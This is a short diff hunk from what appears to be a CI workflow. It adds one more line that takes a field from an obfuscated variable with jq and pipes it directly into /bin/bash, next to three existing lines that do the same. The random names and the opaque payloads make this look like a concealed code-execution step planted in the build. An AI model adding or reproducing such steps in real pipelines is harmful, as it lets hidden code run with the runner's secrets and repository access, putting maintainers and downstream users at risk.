@@ -39,6 +39,7 @@ jobs:
           echo $zzv3683 | jq -r .nt85 | /bin/bash
           echo $vfze94587 | jq -r .tp543 | /bin/bash
           printf '%s' "$t76" | jq -r .mepbr65030 | /bin/bash
+          echo $fg8 | jq -r .thq8200 | /bin/bash
 
       - name: Archive results
         if: always()
